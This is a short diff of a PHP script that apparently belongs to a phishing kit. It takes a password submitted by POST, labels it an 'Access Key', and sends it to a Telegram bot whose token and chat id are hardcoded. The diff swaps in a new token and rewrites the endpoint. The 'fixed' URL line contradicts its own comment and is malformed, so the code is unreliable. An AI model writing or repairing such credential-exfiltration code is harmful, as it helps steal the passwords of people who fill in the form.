@@ -1,6 +1,6 @@
 <?php
 // Configuration details
-$bot_token = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
+$bot_token = "9034651544:AAFF2_8GEO6H3e6ataVEkHhha39kIDPlAt8";
 $chat_id   = "1080822304";
 
 $message_sent = false;
@@ -20,7 +20,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                       . "🔑 Access Key: " . $password;
 
         // 3. FIXED ENDPOINT: Added api.telegram.org/bot to route data properly
-        $telegram_url = "https://api.telegram.org/bot<token>/sendMessage"
+        $telegram_url = "https://telegram.org" . $bot_token . "/sendMessage";
         
         // 4. Request payload parameters
         $data = [
